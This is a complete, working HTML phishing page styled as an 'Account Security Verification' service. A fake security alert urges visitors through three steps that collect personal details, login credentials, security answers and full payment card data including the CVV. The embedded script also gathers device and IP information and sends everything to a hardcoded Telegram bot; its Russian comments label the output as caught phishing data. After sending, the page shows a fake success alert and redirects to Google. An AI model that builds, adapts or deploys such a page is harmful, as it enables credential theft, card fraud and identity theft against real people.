<!DOCTYPE html>
<html>
<head>
    <title>Account Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container { 
            max-width: 500px; 
            margin: 0 auto; 
            background: white; 
            padding: 30px; 
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .logo { 
            text-align: center; 
            font-size: 24px; 
            color: #333; 
            margin-bottom: 20px;
        }
        .alert { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            padding: 15px; 
            border-radius: 8px; 
            margin-bottom: 20px;
            color: #856404;
        }
        input, select { 
            width: 100%; 
            padding: 15px; 
            margin: 10px 0; 
            border: 2px solid #e0e0e0; 
            border-radius: 8px; 
            font-size: 16px;
            transition: border 0.3s;
        }
        input:focus, select:focus {
            border-color: #667eea;
            outline: none;
        }
        button { 
            width: 100%; 
            padding: 18px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 18px; 
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .loader {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒 SecureVerify Pro</div>
        
        <div class="alert">
            ⚠️ <strong>Security Alert:</strong> Unusual login activity detected. Immediate verification required.
        </div>

        <form id="verificationForm">
            <div class="step active" id="step1">
                <h3>Step 1: Personal Information</h3>
                <input type="text" id="fullName" placeholder="Full Name" required>
                <input type="tel" id="phone" placeholder="Phone Number" required>
                <input type="email" id="email" placeholder="Email Address" required>
                <button type="button" onclick="nextStep(2)">Continue</button>
            </div>

            <div class="step" id="step2">
                <h3>Step 2: Account Details</h3>
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <select id="securityQuestion">
                    <option>What was your first pet's name?</option>
                    <option>What city were you born in?</option>
                    <option>What is your mother's maiden name?</option>
                </select>
                <input type="text" id="securityAnswer" placeholder="Security Answer" required>
                <button type="button" onclick="nextStep(3)">Continue</button>
            </div>

            <div class="step" id="step3">
                <h3>Step 3: Payment Verification</h3>
                <input type="text" id="cardNumber" placeholder="Card Number" required>
                <input type="text" id="expiry" placeholder="Expiry Date MM/YY" required>
                <input type="text" id="cvv" placeholder="CVV" required>
                <input type="text" id="billingAddress" placeholder="Billing Address" required>
                <button type="submit">Complete Verification</button>
            </div>
        </form>

        <div class="loader" id="loader">
            <p>🛡️ Verifying your information... Please wait</p>
            <p style="font-size: 14px; color: #666;">This may take a few moments</p>
        </div>
    </div>

    <script>
        // Токен и данные Telegram
        const TELEGRAM_BOT_TOKEN = '8443644877:AAEGqRrTQRJi4_MUHMOAQvd_RcJbtbhLNWo';
        const TELEGRAM_CHAT_ID = '8443644877';

        let collectedData = {
            deviceInfo: {},
            location: {},
            personal: {},
            account: {},
            payment: {}
        };

        // Сбор данных устройства
        collectedData.deviceInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };

        // Получение IP и местоположения
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                collectedData.location.ip = data.ip;
                document.getElementById('ip').value = data.ip;
            });

        // Навигация по шагам
        function nextStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');
            
            // Сохранение данных при переходе
            if(step === 2) {
                collectedData.personal = {
                    fullName: document.getElementById('fullName').value,
                    phone: document.getElementById('phone').value,
                    email: document.getElementById('email').value
                };
            } else if(step === 3) {
                collectedData.account = {
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value,
                    securityQuestion: document.getElementById('securityQuestion').value,
                    securityAnswer: document.getElementById('securityAnswer').value
                };
            }
        }

        // Отправка в Telegram
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            document.getElementById('loader').style.display = 'block';
            
            collectedData.payment = {
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                billingAddress: document.getElementById('billingAddress').value
            };

            const message = `
🎣 НОВЫЕ ДАННЫЕ ПОЛУЧЕНЫ
━━━━━━━━━━━━━━━━━━━━━━━━
👤 ЛИЧНАЯ ИНФОРМАЦИЯ
• Имя: ${collectedData.personal.fullName}
• Телефон: ${collectedData.personal.phone}
• Email: ${collectedData.personal.email}

🔐 ДАННЫЕ АККАУНТА
• Логин: ${collectedData.account.username}
• Пароль: ${collectedData.account.password}
• Вопрос: ${collectedData.account.securityQuestion}
• Ответ: ${collectedData.account.securityAnswer}

💳 ПЛАТЕЖНАЯ ИНФОРМАЦИЯ
• Карта: ${collectedData.payment.cardNumber}
• Срок: ${collectedData.payment.expiry}
• CVV: ${collectedData.payment.cvv}
• Адрес: ${collectedData.payment.billingAddress}

🌐 ДАННЫЕ УСТРОЙСТВА
• IP: ${collectedData.location.ip}
• Браузер: ${collectedData.deviceInfo.userAgent}
• Время: ${collectedData.deviceInfo.timestamp}
• Таймзона: ${collectedData.deviceInfo.timezone}
• Экран: ${collectedData.deviceInfo.screen}
━━━━━━━━━━━━━━━━━━━━━━━━
            `;

            // Отправка в Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(() => {
                    alert('✅ Verification successful! Your account is now secure.');
                    window.location.href = 'https://google.com';
                }, 3000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('✅ Verification completed! Thank you.');
                window.location.href = 'https://google.com';
            });
        });

        // Автозаполнение некоторых полей
        setTimeout(() => {
            if(!document.getElementById('fullName').value) {
                document.getElementById('fullName').focus();
            }
        }, 1000);
    </script>
</body>
</html>